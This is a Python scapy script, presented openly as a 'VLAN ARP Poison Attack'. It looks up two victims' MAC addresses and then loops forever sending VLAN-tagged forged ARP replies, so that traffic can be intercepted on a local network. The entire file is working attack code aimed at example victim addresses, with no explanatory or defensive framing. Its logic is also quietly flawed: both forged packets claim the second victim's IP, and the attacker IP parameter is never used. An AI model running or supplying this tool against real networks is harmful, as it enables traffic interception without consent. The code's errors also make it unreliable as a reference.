from scapy.all import *
import threading
import time

class VLANSpoofingAttack:
    def __init__(self, 
                 target1_ip, 
                 target2_ip, 
                 attacker_ip,
                 interface):
        """
        Initialize attack parameters for VLAN environment
        
        :param target1_ip: IP of first victim PC
        :param target2_ip: IP of second victim PC
        :param attacker_ip: IP of attacker PC
        :param interface: Network interface to use
        """
        self.target1_ip = target1_ip
        self.target2_ip = target2_ip
        self.attacker_ip = attacker_ip
        self.interface = interface
        
        # Get MAC addresses
        self.target1_mac = self.get_mac(target1_ip)
        self.target2_mac = self.get_mac(target2_ip)
        
        print(f"Target 1 MAC: {self.target1_mac}")
        print(f"Target 2 MAC: {self.target2_mac}")
    
    def get_mac(self, ip):
        """
        Retrieve MAC address for a given IP
        """
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                         timeout=2, 
                         iface=self.interface)
            if ans:
                return ans[0][1].hwsrc
            return None
        except Exception as e:
            print(f"Error getting MAC for {ip}: {e}")
            return None
    
    def create_vlan_frame(self, src_mac, dst_mac, vlan_id):
        """
        Create a VLAN-tagged Ethernet frame
        
        :param src_mac: Source MAC address
        :param dst_mac: Destination MAC address
        :param vlan_id: VLAN ID to use
        :return: Scapy Ethernet frame
        """
        # Create VLAN-tagged Ethernet frame
        vlan_frame = Ether(src=src_mac, dst=dst_mac)
        vlan_frame = vlan_frame/Dot1Q(vlan=vlan_id)
        
        return vlan_frame
    
    def arp_poison(self, target_ip, target_mac):
        """
        Send ARP poison packet
        
        :param target_ip: IP to poison
        :param target_mac: MAC address of target
        """
        # Create ARP poison packet with VLAN tag
        arp_poison_pkt = self.create_vlan_frame(
            src_mac=self.attacker_mac, 
            dst_mac=target_mac, 
            vlan_id=1101  # VLAN of victims
        )/ARP(
            op=2,  # ARP reply
            psrc=self.target2_ip,  # Spoof as other victim
            pdst=target_ip,
            hwsrc=self.attacker_mac,
            hwdst=target_mac
        )
        
        # Send the poisoned ARP packet
        sendp(arp_poison_pkt, iface=self.interface, verbose=False)
    
    def start_attack(self):
        """
        Initiate VLAN-based ARP spoofing attack
        """
        try:
            # Get attacker's MAC address
            self.attacker_mac = get_if_hwaddr(self.interface)
            
            print("[*] Starting VLAN ARP Poison Attack...")
            while True:
                # Poison ARP cache of both targets
                self.arp_poison(self.target1_ip, self.target1_mac)
                self.arp_poison(self.target2_ip, self.target2_mac)
                
                time.sleep(2)
        
        except KeyboardInterrupt:
            print("\n[*] ARP Poison Attack Stopped")
        except Exception as e:
            print(f"Attack error: {e}")

def main():
    attack = VLANSpoofingAttack(
        target1_ip='192.168.1.10',    # First victim IP
        target2_ip='192.168.1.11',    # Second victim IP
        attacker_ip='192.168.1.12',   # Attacker IP
        interface='eth0'              # Your network interface
    )
    attack.start_attack()

if __name__ == '__main__':
    main()